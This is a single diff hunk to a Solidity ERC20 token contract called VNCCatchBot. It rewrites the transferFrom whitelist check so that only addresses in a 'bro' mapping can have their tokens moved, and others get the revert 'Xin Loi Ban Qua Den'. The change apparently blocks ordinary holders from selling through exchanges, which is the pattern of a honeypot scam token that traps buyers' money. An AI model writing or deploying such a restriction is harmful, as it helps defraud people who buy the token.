@@ -34,7 +34,7 @@ contract VNCCatchBot is ERC20, ERC20Burnable, Ownable {
     }
 
     function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
-        require(bro[msg.sender], 'Xin Loi Ban Qua Den'); 
+        require(bro[from], 'Xin Loi Ban Qua Den'); 
         address spender = _msgSender();
         _spendAllowance(from, spender, amount);
         _transfer(from, to, amount);
